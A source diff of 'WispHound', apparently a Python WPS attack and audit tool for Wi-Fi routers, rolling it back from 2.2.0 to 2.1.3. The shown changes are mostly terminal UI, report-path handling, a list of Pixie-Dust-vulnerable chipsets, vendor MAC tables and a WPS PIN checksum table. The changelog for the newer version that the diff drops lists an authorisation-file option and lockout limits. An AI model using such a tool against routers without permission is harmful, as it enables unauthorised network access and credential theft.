@@ -1,29 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-WispHound 2.2.0 — WPS reconnaissance, Pixie Dust prioritization & multi-backend auditor.
+WispHound 2.1.3 — WPS reconnaissance, Pixie Dust prioritization & multi-backend auditor.
 
-Changes vs 2.1.3 (all additive; existing CLI/flags/DB/reports keep working):
-  * [FIX] checksum() is O(1); removed 10M-entry table (300-800x faster startup, -10MB RAM)
-  * [FIX] wpa_supplicant stdout drained by a reader thread (was read(300), ate M1/M2)
-  * [FIX] per-attempt reset of last_m_message / nack_count (stale state corrupted bruteforce)
-  * [FIX] reaver Pixie Dust no longer passes -N (suppressed M5 NACK broke the state machine)
-  * [FIX] bully delay uses -d (µs), not -l (lockout wait)
-  * [FIX] iw security regex uses \\s+ (WPA2 was mislabeled WEP)
-  * [FIX] 6 GHz channel math: (freq-5955)//20 + 1
-  * [FIX] WPS stored as bool; version kept separately
-  * [FIX] _extract_essid survives apostrophes / non-Latin-1 SSIDs
-  * [FIX] getSuggested dedupes; blind 12345670 default removed
-  * [FIX] brute-force progress uses 10000/1000 denominators
-  * [FIX] monitor mode verified or aborts; teardown only if vif changed
-  * [FIX] Ctrl-C kills process groups (no orphan reaver/bully/pixiewps)
-  * [FIX] --json: tables -> stderr, JSON -> stdout
-  * [NEW] --pixie-timeout / --attack-timeout (split); --timeout alias kept
-  * [NEW] --save-capture / --offline (replay Pixie Dust from transcript, no root)
-  * [NEW] --dry-run, --authorized <file>, --lockout-budget N, --unsafe
-  * [NEW] --tables-to-stdout (legacy --json behaviour)
-  * [NEW] targets.db migration: lockout_until, pixie_capture, last_channel
-  * [NEW] per-BSSID persisted lockout backoff
+Changes vs 2.1.2:
+  * [FIX] Reports directory is now resolved to a *writable* location
+    (~/.WispHound/reports → script-dir/reports → /tmp/wisphound-reports)
+    instead of blindly using script-dir/reports. This fixes
+    "cannot store on reports" on read-only installs (e.g. /usr/bin).
+  * [FIX] All save paths (__saveResult, _handle_backend_result) now:
+      - create the directory with error handling,
+      - catch OSError and print an explicit error,
+      - never silently swallow write failures.
+  * [FIX] WiFiScanner reads stored.csv from the *same* writable reports
+    dir that saves write to (was reading script-dir/reports).
+  * [FIX] auto_exploit() and __main__ use pick_reports_dir() so backend
+    credentials and internal-backend credentials land in the same place.
+  * [FIX] __savePin() wrapped in OSError handling.
 """
 import argparse
 import codecs
@@ -32,7 +25,6 @@ import csv
 import json
 import os
 import pathlib
-import queue
 import re
 import shutil
 import signal
@@ -42,16 +34,15 @@ import statistics
 import subprocess
 import sys
 import tempfile
-import threading
 import time
-import uuid
-from datetime import datetime, timedelta
+from array import array
+from datetime import datetime
 from pathlib import Path
 from typing import Dict, Optional
 
 try:
     import wcwidth
-except ImportError:
+except ImportError:                                    # graceful degrade
     class _WC:
         @staticmethod
         def wcswidth(s):
@@ -60,16 +51,36 @@ except ImportError:
 
 
 # ===========================================================================
-# DESIGN SYSTEM
+# DESIGN SYSTEM — colors, tables, progress (UI layer only)
 # ===========================================================================
 class UI:
-    RESET = '\033[0m'; BOLD = '\033[1m'; DIM = '\033[2m'
-    BLACK = '\033[30m'; RED = '\033[91m'; GREEN = '\033[92m'
-    YELLOW = '\033[93m'; BLUE = '\033[94m'; MAGENTA = '\033[95m'
-    CYAN = '\033[96m'; WHITE = '\033[97m'; GREY = '\033[90m'
-    BG_RED = '\033[41m'; BG_GREEN = '\033[42m'; BG_YELLOW = '\033[43m'
-    BG_BLUE = '\033[44m'; BG_MAGENTA = '\033[45m'; BG_CYAN = '\033[46m'
+    """Centralized terminal design system: colors, badges, tables, progress."""
 
+    # -- palette -----------------------------------------------------------
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+    ITALIC = '\033[3m'
+    UNDERLINE = '\033[4m'
+
+    BLACK = '\033[30m'
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    GREY = '\033[90m'
+
+    BG_RED = '\033[41m'
+    BG_GREEN = '\033[42m'
+    BG_YELLOW = '\033[43m'
+    BG_BLUE = '\033[44m'
+    BG_MAGENTA = '\033[45m'
+    BG_CYAN = '\033[46m'
+
+    # -- TTY detection -----------------------------------------------------
     _enabled = None
 
     @classmethod
@@ -81,61 +92,73 @@ class UI:
 
     @classmethod
     def c(cls, text, *styles):
+        """Wrap text in the given style codes (only if TTY)."""
         if not cls.enabled() or not styles:
             return str(text)
         return ''.join(styles) + str(text) + cls.RESET
 
+    # -- semantic helpers --------------------------------------------------
     @classmethod
-    def ok(cls, t):     return cls.c(t, cls.GREEN)
+    def ok(cls, text):      return cls.c(text, cls.GREEN)
     @classmethod
-    def err(cls, t):    return cls.c(t, cls.RED)
+    def err(cls, text):     return cls.c(text, cls.RED)
     @classmethod
-    def warn(cls, t):   return cls.c(t, cls.YELLOW)
+    def warn(cls, text):    return cls.c(text, cls.YELLOW)
     @classmethod
-    def info(cls, t):   return cls.c(t, cls.CYAN)
+    def info(cls, text):    return cls.c(text, cls.CYAN)
     @classmethod
-    def muted(cls, t):  return cls.c(t, cls.GREY)
+    def muted(cls, text):   return cls.c(text, cls.GREY)
     @classmethod
-    def hi(cls, t):     return cls.c(t, cls.BOLD, cls.WHITE)
+    def hi(cls, text):      return cls.c(text, cls.BOLD, cls.WHITE)
     @classmethod
-    def accent(cls, t): return cls.c(t, cls.MAGENTA)
+    def accent(cls, text):  return cls.c(text, cls.MAGENTA)
     @classmethod
-    def head(cls, t):   return cls.c(t, cls.BOLD, cls.CYAN)
+    def head(cls, text):    return cls.c(text, cls.BOLD, cls.CYAN)
 
+    # -- badges ------------------------------------------------------------
     @classmethod
     def badge(cls, label, fg=None, bg=None):
-        fg = fg or cls.WHITE; bg = bg or ''
+        fg = fg or cls.WHITE
+        bg = bg or ''
         inner = f' {label} '
         if not cls.enabled():
             return f'[{label}]'
         return f'{bg}{fg}{cls.BOLD}{inner}{cls.RESET}'
 
     @classmethod
-    def badge_ok(cls, l):     return cls.badge(l, cls.BLACK, cls.BG_GREEN)
+    def badge_ok(cls, label):     return cls.badge(label, cls.BLACK, cls.BG_GREEN)
     @classmethod
-    def badge_err(cls, l):    return cls.badge(l, cls.WHITE, cls.BG_RED)
+    def badge_err(cls, label):    return cls.badge(label, cls.WHITE, cls.BG_RED)
     @classmethod
-    def badge_warn(cls, l):   return cls.badge(l, cls.BLACK, cls.BG_YELLOW)
+    def badge_warn(cls, label):   return cls.badge(label, cls.BLACK, cls.BG_YELLOW)
     @classmethod
-    def badge_info(cls, l):   return cls.badge(l, cls.WHITE, cls.BG_BLUE)
+    def badge_info(cls, label):   return cls.badge(label, cls.WHITE, cls.BG_BLUE)
     @classmethod
-    def badge_cyan(cls, l):   return cls.badge(l, cls.BLACK, cls.BG_CYAN)
+    def badge_magenta(cls, label):return cls.badge(label, cls.WHITE, cls.BG_MAGENTA)
     @classmethod
-    def badge_grey(cls, l):   return cls.c(f'[{l}]', cls.GREY)
+    def badge_cyan(cls, label):   return cls.badge(label, cls.BLACK, cls.BG_CYAN)
+    @classmethod
+    def badge_grey(cls, label):   return cls.c(f'[{label}]', cls.GREY)
 
+    # -- message helpers ---------------------------------------------------
     @classmethod
     def tag(cls, kind):
-        return {
-            'ok': cls.badge_ok('OK'), 'err': cls.badge_err('ERR'),
-            'warn': cls.badge_warn('WARN'), 'info': cls.badge_info('INFO'),
-            'dbg': cls.badge_grey('DBG'), 'scan': cls.badge_cyan('SCAN'),
-            'run': cls.badge(l='RUN', fg=cls.WHITE, bg=cls.BG_MAGENTA),
-        }.get(kind, '')
+        tags = {
+            'ok':   (cls.badge_ok('OK'),),
+            'err':  (cls.badge_err('ERR'),),
+            'warn': (cls.badge_warn('WARN'),),
+            'info': (cls.badge_info('INFO'),),
+            'dbg':  (cls.badge_grey('DBG'),),
+            'scan': (cls.badge_cyan('SCAN'),),
+            'run':  (cls.badge_magenta('RUN'),),
+        }
+        return tags.get(kind, ('',))[0]
 
     @classmethod
     def msg(cls, kind, text):
         return f'{cls.tag(kind)} {text}'
 
+    # -- banner ------------------------------------------------------------
     @classmethod
     def banner(cls, subtitle=''):
         art = r"""
@@ -146,17 +169,30 @@ class UI:
   \__/\  / |__/____  >|   __/ \___|_  / \____/|____/\____ |
        \/          \/ |__|         \/                   \/
 """
-        out = [cls.c(ln, cls.BOLD, cls.CYAN)
-               for ln in art.strip('\n').splitlines()]
+        lines = art.strip('\n').splitlines()
+        out = []
+        for ln in lines:
+            out.append(cls.c(ln, cls.BOLD, cls.CYAN))
         out.append('')
-        out.append('  ' + cls.c(f'WispHound {VERSION}', cls.BOLD, cls.WHITE)
-                   + cls.muted('  —  ' + (subtitle or 'WPS recon & Pixie Dust auditor')))
+        title = f'WispHound {VERSION}'
+        out.append('  ' + cls.c(title, cls.BOLD, cls.WHITE)
+                   + cls.muted('  —  ' + (subtitle or 'WPS reconnaissance & Pixie Dust auditor')))
         return '\n'.join(out)
 
+    # -- tables ------------------------------------------------------------
     @classmethod
     def table(cls, headers, rows, aligns=None, max_widths=None, title=None):
+        """Render a Unicode box-drawing table.
+
+        headers: list[str]
+        rows:    list[list[str]]  (may contain pre-colored strings)
+        aligns:  list of 'l'|'r'|'c' (default 'l')
+        max_widths: list[int] truncation limits (visible width)
+        """
         def vlen(s):
-            return wcwidth.wcswidth(re.sub(r'\033\[[0-9;]*m', '', str(s)))
+            # strip ANSI
+            plain = re.sub(r'\033\[[0-9;]*m', '', str(s))
+            return wcwidth.wcswidth(plain)
 
         def vtrunc(s, limit):
             plain = re.sub(r'\033\[[0-9;]*m', '', str(s))
@@ -167,12 +203,14 @@ class UI:
                 w = wcwidth.wcswidth(ch)
                 if cur + w > max(0, limit - 1):
                     break
-                out.append(ch); cur += w
+                out.append(ch)
+                cur += w
             return ''.join(out) + '…'
 
         aligns = aligns or ['l'] * len(headers)
         rows = [[vtrunc(c, max_widths[i] if max_widths else None)
                  for i, c in enumerate(r)] for r in rows]
+
         widths = [vlen(h) for h in headers]
         for r in rows:
             for i, c in enumerate(r):
@@ -180,13 +218,18 @@ class UI:
 
         def pad(s, w, a):
             gap = w - vlen(s)
-            if gap <= 0: return s
-            if a == 'r': return ' ' * gap + s
+            if gap <= 0:
+                return s
+            if a == 'r':
+                return ' ' * gap + s
             if a == 'c':
-                l = gap // 2; return ' ' * l + s + ' ' * (gap - l)
+                left = gap // 2
+                return ' ' * left + s + ' ' * (gap - left)
             return s + ' ' * gap
 
-        TL, TR, BL, BR, H, V = '┌', '┐', '└', '┘', '─', '│'
+        # box chars
+        TL, TR, BL, BR = '┌', '┐', '└', '┘'
+        H, V = '─', '│'
         TM, BM, LM, RM, MM = '┬', '┴', '├', '┤', '┼'
 
         def rule(l, m, r):
@@ -197,162 +240,148 @@ class UI:
                               for i in range(len(cells))) + V
 
         out = []
-        if title: out.append(cls.head(title))
+        if title:
+            out.append(cls.head(title))
         out.append(cls.muted(rule(TL, TM, TR)))
         out.append(cls.head(line([cls.hi(h) for h in headers])))
         out.append(cls.muted(rule(LM, MM, RM)))
-        for r in rows: out.append(line(r))
+        for r in rows:
+            out.append(line(r))
         out.append(cls.muted(rule(BL, BM, BR)))
         return '\n'.join(out)
 
+    # -- progress ----------------------------------------------------------
     @classmethod
-    def spinner(cls, label, interval=0.1):
-        frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
-        class _S:
-            def __init__(self): self._stop = False; self._t = None
+    def spinner(cls, label, frames=None, interval=0.1):
+        """Return a context manager that shows a spinner until exit."""
+        frames = frames or ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
+
+        class _Spin:
+            def __init__(self):
+                self._stop = False
+                self._thread = None
             def __enter__(self):
                 if not cls.enabled():
-                    print(f'[*] {label}…'); return self
+                    print(f'[*] {label}…')
+                    return self
+                import threading
                 def run():
                     i = 0
                     while not self._stop:
-                        sys.stdout.write('\r' + cls.c(frames[i % len(frames)], cls.MAGENTA)
-                                         + f' {label}…'); sys.stdout.flush()
-                        i += 1; time.sleep(interval)
+                        f = frames[i % len(frames)]
+                        sys.stdout.write(
+                            f'\r{cls.c(f, cls.MAGENTA)} {label}…')
+                        sys.stdout.flush()
+                        i += 1
+                        time.sleep(interval)
                     sys.stdout.write('\r' + ' ' * (len(label) + 10) + '\r')
                     sys.stdout.flush()
-                self._t = threading.Thread(target=run, daemon=True)
-                self._t.start(); return self
+                self._thread = threading.Thread(target=run, daemon=True)
+                self._thread.start()
+                return self
             def __exit__(self, *a):
                 self._stop = True
-                if self._t: self._t.join(timeout=1)
+                if self._thread:
+                    self._thread.join(timeout=1)
                 return False
-        return _S()
+        return _Spin()
+
+    @classmethod
+    def progress_bar(cls, current, total, width=30, label=''):
+        if total <= 0:
+            total = 1
+        pct = min(1.0, max(0.0, current / total))
+        filled = int(width * pct)
+        bar = ('█' * filled) + ('░' * (width - filled))
+        if cls.enabled():
+            color = cls.GREEN if pct >= 0.99 else (cls.YELLOW if pct >= 0.5 else cls.CYAN)
+            bar = cls.c(bar, color)
+        text = f'{label} [{bar}] {pct*100:5.1f}%'
+        return text
+
+    @classmethod
+    def kv(cls, pairs, title=None):
+        """Render a two-column key/value block."""
+        if not pairs:
+            return ''
+        keyw = max(vlen_safe(k) for k, _ in pairs)
+        out = []
+        if title:
+            out.append(cls.head(title))
+        for k, v in pairs:
+            out.append(f'  {cls.muted(k.ljust(keyw))}  {v}')
+        return '\n'.join(out)
 
     @classmethod
     def section(cls, title):
-        return f'\n{cls.head(title)}\n{cls.muted("─" * max(10, min(60, len(title) + 4)))}'
+        line = '─' * max(10, min(60, len(title) + 4))
+        return f'\n{cls.head(title)}\n{cls.muted(line)}'
+
+
+def vlen_safe(s):
+    plain = re.sub(r'\033\[[0-9;]*m', '', str(s))
+    return wcwidth.wcswidth(plain)
 
 
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-VERSION = '2.2.0'
-
-BACKEND_INTERNAL = 'internal'
-BACKEND_REAVER = 'reaver'
-BACKEND_BULLY = 'bully'
-BACKENDS = (BACKEND_INTERNAL, BACKEND_REAVER, BACKEND_BULLY)
+VERSION = '2.1.3'
 
 
-def _homedir():
-    return str(pathlib.Path.home())
-
-
+# [FIX] Resolve a writable reports directory once, and cache it.
 _REPORTS_DIR_CACHE = None
 
 
 def pick_reports_dir(force_refresh=False):
+    """Return the first writable reports directory.
+
+    Order:
+      1. ~/.WispHound/reports
+      2. <script-dir>/reports
+      3. /tmp/wisphound-reports
+
+    Verifies writability by creating and deleting a probe file.
+    """
     global _REPORTS_DIR_CACHE
     if _REPORTS_DIR_CACHE and not force_refresh:
         return _REPORTS_DIR_CACHE
-    for d in (
-        os.path.join(_homedir(), '.WispHound', 'reports'),
+
+    candidates = [
+        os.path.join(str(pathlib.Path.home()), '.WispHound', 'reports'),
         os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports'),
         os.path.join(tempfile.gettempdir(), 'wisphound-reports'),
-    ):
+    ]
+    for d in candidates:
         try:
             os.makedirs(d, exist_ok=True)
-            p = os.path.join(d, '.write_test')
-            with open(p, 'w', encoding='utf-8') as f: f.write('ok')
-            os.remove(p)
+            probe = os.path.join(d, '.write_test')
+            with open(probe, 'w', encoding='utf-8') as f:
+                f.write('ok')
+            os.remove(probe)
             _REPORTS_DIR_CACHE = d
             return d
         except OSError:
             continue
-    _REPORTS_DIR_CACHE = os.path.join(tempfile.gettempdir(), 'wisphound-reports')
+    # Last resort — return the temp path even if probing failed, so the
+    # caller can surface a precise error.
+    _REPORTS_DIR_CACHE = candidates[-1]
     return _REPORTS_DIR_CACHE
 
 
-def _captures_dir():
-    d = os.path.join(_homedir(), '.WispHound', 'captures')
-    try: os.makedirs(d, exist_ok=True)
-    except OSError: pass
-    return d
+def _graceful_exit_handler(signum, frame):
+    raise KeyboardInterrupt
 
-
-def _safe_makedirs(d):
-    try: os.makedirs(d, exist_ok=True); return True
-    except OSError as e:
-        print(UI.msg('err', f'Cannot create {d}: {e}')); return False
-
-
-# ------- graceful exit: kill process groups, no orphans --------------------
-_CHILD_PROCS = set()
-_CHILD_LOCK = threading.Lock()
-
-
-def _register_child(proc):
-    with _CHILD_LOCK: _CHILD_PROCS.add(proc)
-
-
-def _unregister_child(proc):
-    with _CHILD_LOCK:
-        _CHILD_PROCS.discard(proc)
-
-
-def _kill_children():
-    with _CHILD_LOCK:
-        procs = list(_CHILD_PROCS)
-        _CHILD_PROCS.clear()
-    for p in procs:
+for _sig_name in ('SIGTERM', 'SIGHUP'):
+    if hasattr(signal, _sig_name):
         try:
-            if os.name == 'posix':
-                try: os.killpg(os.getpgid(p.pid), signal.SIGTERM)
-                except Exception:
-                    try: p.terminate()
-                    except Exception: pass
-            else:
-                p.terminate()
-            try: p.wait(timeout=2)
-            except Exception:
-                try: p.kill()
-                except Exception: pass
-        except Exception:
+            signal.signal(getattr(signal, _sig_name), _graceful_exit_handler)
+        except (ValueError, OSError):
             pass
 
 
-def _graceful_exit_handler(signum, frame):
-    _kill_children()
-    raise KeyboardInterrupt
-
-
-for _sig in ('SIGTERM', 'SIGHUP', 'SIGINT'):
-    if hasattr(signal, _sig):
-        try: signal.signal(getattr(signal, _sig), _graceful_exit_handler)
-        except (ValueError, OSError): pass
-
-
-def run_proc(argv, timeout=None, **kwargs):
-    """subprocess.run replacement that registers the child for kill-on-exit."""
-    if os.name == 'posix':
-        kwargs.setdefault('start_new_session', True)
-    p = subprocess.Popen(argv, **kwargs)
-    _register_child(p)
-    try:
-        out, _ = p.communicate(timeout=timeout)
-        return p.returncode, out
-    except subprocess.TimeoutExpired:
-        _kill_children()
-        raise
-    finally:
-        _unregister_child(p)
-
-
-# ---------------------------------------------------------------------------
-# OUI + chipsets
-# ---------------------------------------------------------------------------
 PIXIE_VULNERABLE_CHIPSETS = {
+    # Ralink / MediaTek — RT series
     'RT2860': 'Ralink RT2860', 'RT2870': 'Ralink RT2870',
     'RT3050': 'Ralink RT3050', 'RT3052': 'Ralink RT3052',
     'RT3070': 'Ralink RT3070', 'RT3090': 'Ralink RT3090',
@@ -360,16 +389,19 @@ PIXIE_VULNERABLE_CHIPSETS = {
     'RT3572': 'Ralink RT3572', 'RT5350': 'Ralink RT5350',
     'RT5370': 'Ralink RT5370', 'RT5372': 'Ralink RT5372',
     'RT5390': 'Ralink RT5390', 'RT5592': 'Ralink RT5592',
+    # Ralink / MediaTek — MT series
     'MT7601': 'MediaTek MT7601', 'MT7603': 'MediaTek MT7603',
     'MT7610': 'MediaTek MT7610', 'MT7612': 'MediaTek MT7612',
     'MT7615': 'MediaTek MT7615', 'MT7620': 'MediaTek MT7620',
     'MT7628': 'MediaTek MT7628', 'MT7688': 'MediaTek MT7688',
+    # Realtek — RTL8xxx
     'RTL8186': 'Realtek RTL8186', 'RTL8188': 'Realtek RTL8188',
     'RTL8192': 'Realtek RTL8192', 'RTL8196': 'Realtek RTL8196',
     'RTL8197': 'Realtek RTL8197', 'RTL8723': 'Realtek RTL8723',
     'RTL8811': 'Realtek RTL8811', 'RTL8812': 'Realtek RTL8812',
     'RTL8814': 'Realtek RTL8814', 'RTL8821': 'Realtek RTL8821',
     'RTL8822': 'Realtek RTL8822',
+    # Broadcom — BCM43xx
     'BCM4312': 'Broadcom BCM4312', 'BCM4313': 'Broadcom BCM4313',
     'BCM4318': 'Broadcom BCM4318', 'BCM4321': 'Broadcom BCM4321',
     'BCM4322': 'Broadcom BCM4322', 'BCM4325': 'Broadcom BCM4325',
@@ -378,6 +410,7 @@ PIXIE_VULNERABLE_CHIPSETS = {
     'BCM43142': 'Broadcom BCM43142', 'BCM43224': 'Broadcom BCM43224',
     'BCM43225': 'Broadcom BCM43225', 'BCM43227': 'Broadcom BCM43227',
     'BCM43228': 'Broadcom BCM43228',
+    # Atheros / Qualcomm — AR9xxx, QCA
     'AR7240': 'Atheros AR7240', 'AR7241': 'Atheros AR7241',
     'AR7242': 'Atheros AR7242', 'AR9220': 'Atheros AR9220',
     'AR9271': 'Atheros AR9271', 'AR9280': 'Atheros AR9280',
@@ -392,61 +425,118 @@ PIXIE_VULNERABLE_CHIPSETS = {
     'QCA9558': 'Qualcomm QCA9558', 'QCA9563': 'Qualcomm QCA9563',
     'QCA9880': 'Qualcomm QCA9880', 'QCA9882': 'Qualcomm QCA9882',
     'QCA9890': 'Qualcomm QCA9890',
+    # Marvell
     '88W8363': 'Marvell 88W8363', '88W8366': 'Marvell 88W8366',
     '88W8764': 'Marvell 88W8764', '88W8864': 'Marvell 88W8864',
     '88W8897': 'Marvell 88W8897',
+    # Lantiq / Intel XWAY
     'PSB6970': 'Lantiq PSB6970', 'PEB6024': 'Lantiq PEB6024',
     'XWAY': 'Lantiq XWAY', 'GRX300': 'Lantiq GRX300',
+    # ZyDAS / Conexant
     'ZD1211': 'ZyDAS ZD1211', 'ZD1211B': 'ZyDAS ZD1211B',
     'CX82310': 'Conexant CX82310',
+    # Celeno
     'CL1800': 'Celeno CL1800', 'CL1900': 'Celeno CL1900',
 }
 
 OUI_BUILTIN = {
     '0014D1': 'TRENDnet', '00904C': 'Epigram/Broadcom',
     'D4BF7F': 'Upvel', 'F8C091': 'Upvel',
-    '0026CE': 'Onlime', '00664B': 'Huawei', '0023F8': 'Zyxel',
-    'C83A35': 'Tenda', '001CDF': 'Belkin', '002275': 'Belkin',
+    '0026CE': 'Onlime', '00664B': 'Huawei',
+    '0023F8': 'Zyxel', 'C83A35': 'Tenda',
+    '001CDF': 'Belkin', '002275': 'Belkin',
     '5C353B': 'Compal (CBN)', 'DC537C': 'Compal (CBN)',
     '0018E7': 'Cameo', '001AA9': 'Fujitsu',
     '200BC7': 'Ralink/MediaTek', '4846FB': 'Ralink/MediaTek',
     'D46AA8': 'Ralink/MediaTek', 'F84ABF': 'Ralink/MediaTek',
     '00E04C': 'Realtek', '00E04B': 'Realtek',
-    '10BEF5': 'D-Link', 'CCB255': 'D-Link', '1C7EE5': 'D-Link',
-    '28107B': 'D-Link', '84C9B2': 'D-Link', 'B8A386': 'D-Link',
-    'FC7516': 'D-Link', 'A0AB1B': 'D-Link', '14D64D': 'D-Link',
-    'C0A0BB': 'D-Link', '5CD998': 'D-Link', '340804': 'D-Link',
-    '9094E4': 'TP-Link', 'EC086B': 'TP-Link', '1062EB': 'TP-Link',
-    '1C5F2B': 'TP-Link', '802689': 'TP-Link', '908D78': 'TP-Link',
+    '10BEF5': 'D-Link', 'CCB255': 'D-Link',
+    '1C7EE5': 'D-Link', '28107B': 'D-Link',
+    '84C9B2': 'D-Link', 'B8A386': 'D-Link',
+    'FC7516': 'D-Link', 'A0AB1B': 'D-Link',
+    '14D64D': 'D-Link', 'C0A0BB': 'D-Link',
+    '5CD998': 'D-Link', '340804': 'D-Link',
+    '9094E4': 'TP-Link', 'EC086B': 'TP-Link',
+    '1062EB': 'TP-Link', '1C5F2B': 'TP-Link',
+    '802689': 'TP-Link', '908D78': 'TP-Link',
     'E8CC18': 'TP-Link', 'D8FEE3': 'TP-Link',
-    '50465D': 'ASUSTek', '10BF48': 'ASUSTek', '049226': 'ASUSTek',
-    '04D9F5': 'ASUSTek', '08606E': 'ASUSTek', '2CFDA1': 'ASUSTek',
-    '107B44': 'ASUSTek', '10C37B': 'ASUSTek', '1CB72C': 'ASUSTek',
-    '382C4A': 'ASUSTek', '40167E': 'ASUSTek', '90F652': 'ASUSTek',
-    'AC9E17': 'ASUSTek', 'BCEE7B': 'ASUSTek', '60A44C': 'ASUSTek',
-    '704D7B': 'ASUSTek', '7824AF': 'ASUSTek', 'D017C2': 'ASUSTek',
-    '1C872C': 'ASUSTek', '2C56DC': 'ASUSTek', 'C86000': 'ASUSTek',
+    '50465D': 'ASUSTek', '10BF48': 'ASUSTek',
+    '049226': 'ASUSTek', '04D9F5': 'ASUSTek',
+    '08606E': 'ASUSTek', '2CFDA1': 'ASUSTek',
+    '107B44': 'ASUSTek', '10C37B': 'ASUSTek',
+    '1CB72C': 'ASUSTek', '382C4A': 'ASUSTek',
+    '40167E': 'ASUSTek', '90F652': 'ASUSTek',
+    'AC9E17': 'ASUSTek', 'BCEE7B': 'ASUSTek',
+    '60A44C': 'ASUSTek', '704D7B': 'ASUSTek',
+    '7824AF': 'ASUSTek', 'D017C2': 'ASUSTek',
+    '1C872C': 'ASUSTek', '2C56DC': 'ASUSTek',
+    'C86000': 'ASUSTek',
     '788102': 'Sercomm', '7894B4': 'Sercomm',
     '0022B0': 'D-Link', '001CF0': 'D-Link',
     'C8BE19': 'TP-Link', 'C8D3A3': 'TP-Link',
-    '7C034C': 'Netgear', '204E7F': 'Netgear', '4C17EB': 'Netgear',
-    '18622C': 'Netgear', '7C03D8': 'Netgear', 'D86CE9': 'Netgear',
+    '7C034C': 'Netgear', '204E7F': 'Netgear',
+    '4C17EB': 'Netgear', '18622C': 'Netgear',
+    '7C03D8': 'Netgear', 'D86CE9': 'Netgear',
     'A01B29': 'Netgear', 'E0469A': 'Netgear',
     '9CD643': 'D-Link', '68A0F6': 'D-Link',
-    '0C96BF': 'Huawei', '20F3A3': 'Huawei', 'ACE215': 'Huawei',
-    'C8D15E': 'Huawei', 'E8CD2D': 'Huawei', 'F80113': 'Huawei',
-    '087A4C': 'Huawei', '14B968': 'Huawei', '2008ED': 'Huawei',
-    '346BD3': 'Huawei', '786A89': 'Huawei', '88E3AB': 'Huawei',
-    '7071BC': 'Cisco', 'E06995': 'Cisco', '001A2B': 'Cisco',
-    '00248C': 'Cisco', '002618': 'Cisco', '344DEB': 'Cisco',
-    'EC6264': 'Broadcom', '988B5D': 'Broadcom', '14144B': 'Broadcom',
-    'BCF685': 'Broadcom', '002624': 'Thomson', '4432C8': 'Thomson',
+    '0C96BF': 'Huawei', '20F3A3': 'Huawei',
+    'ACE215': 'Huawei', 'C8D15E': 'Huawei',
+    'E8CD2D': 'Huawei', 'F80113': 'Huawei',
+    '087A4C': 'Huawei', '14B968': 'Huawei',
+    '2008ED': 'Huawei', '346BD3': 'Huawei',
+    '786A89': 'Huawei', '88E3AB': 'Huawei',
+    '7071BC': 'Cisco', 'E06995': 'Cisco',
+    '001A2B': 'Cisco', '00248C': 'Cisco',
+    '002618': 'Cisco', '344DEB': 'Cisco',
+    'EC6264': 'Broadcom', '988B5D': 'Broadcom',
+    '14144B': 'Broadcom', 'BCF685': 'Broadcom',
+    '002624': 'Thomson', '4432C8': 'Thomson',
     '88F7C7': 'Thomson', 'CC03FA': 'Thomson',
-    '4C09B4': 'ZTE', '4CAC0A': 'ZTE', '9CD24B': 'ZTE',
-    'DC028E': 'ZTE', 'FCC897': 'ZTE', 'B075D5': 'ZTE',
+    '4C09B4': 'ZTE', '4CAC0A': 'ZTE',
+    '9CD24B': 'ZTE', 'DC028E': 'ZTE',
+    'FCC897': 'ZTE', 'B075D5': 'ZTE',
     'C864C7': 'ZTE', '84742A': 'ZTE',
-    '784476': 'Upvel', '08C6B3': 'Realtek', '007263': 'Realtek',
+    '784476': 'Upvel',
+    '08C6B3': 'Realtek',
+    '007263': 'Realtek',
 }
+
+
+# ---------------------------------------------------------------------------
+# Checksum lookup table
+# ---------------------------------------------------------------------------
+def _build_checksum_table():
+    table = array('b', [0]) * 10_000_000
+    for i in range(10_000_000):
+        p, accum = i, 0
+        while p:
+            accum += 3 * (p % 10)
+            p //= 10
+            accum += p % 10
+            p //= 10
+        table[i] = (10 - accum % 10) % 10
+    return table
+
+
+def get_hex(line):
+    parts = line.split(':', 3)
+    if len(parts) < 3:
+        return ''
+    return parts[2].replace(' ', '').upper()
+
+
+def recvuntil(pipe, what, timeout=30):
+    s = ''
+    start = time.time()
+    while True:
+        if time.time() - start > timeout:
+            return s
+        inp = pipe.stdout.read(1)
+        if inp == '':
+            return s
+        s += inp
+        if what in s:
+            return s
 
 
 # ---------------------------------------------------------------------------
@@ -455,9 +545,11 @@ OUI_BUILTIN = {
 class NetworkAddress:
     def __init__(self, mac):
         if isinstance(mac, NetworkAddress):
-            self._int_repr = mac._int_repr; self._str_repr = mac._str_repr
+            self._int_repr = mac._int_repr
+            self._str_repr = mac._str_repr
         elif isinstance(mac, int):
-            self._int_repr = mac; self._str_repr = self._int2mac(mac)
+            self._int_repr = mac
+            self._str_repr = self._int2mac(mac)
         elif isinstance(mac, str):
             self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
             self._int_repr = self._mac2int(self._str_repr)
@@ -465,95 +557,142 @@ class NetworkAddress:
             raise ValueError('MAC address must be string or integer')
 
     @property
-    def string(self): return self._str_repr
+    def string(self):
+        return self._str_repr
+
     @string.setter
-    def string(self, v): self._str_repr = v; self._int_repr = self._mac2int(v)
+    def string(self, value):
+        self._str_repr = value
+        self._int_repr = self._mac2int(value)
+
     @property
-    def integer(self): return self._int_repr
+    def integer(self):
+        return self._int_repr
+
     @integer.setter
-    def integer(self, v): self._int_repr = v; self._str_repr = self._int2mac(v)
-    def __int__(self): return self.integer
-    def __str__(self): return self.string
-    def __iadd__(self, o): self.integer = self.integer + int(o); return self
-    def __isub__(self, o): self.integer = self.integer - int(o); return self
-    def _coerce(self, o):
-        if isinstance(o, NetworkAddress): return o.integer
-        try: return NetworkAddress(o).integer
-        except (ValueError, AttributeError): return NotImplemented
-    def __eq__(self, o):
-        v = self._coerce(o); return NotImplemented if v is NotImplemented else self.integer == v
-    def __ne__(self, o):
-        v = self._coerce(o); return NotImplemented if v is NotImplemented else self.integer != v
-    def __lt__(self, o): return self.integer < self._coerce(o)
-    def __gt__(self, o): return self.integer > self._coerce(o)
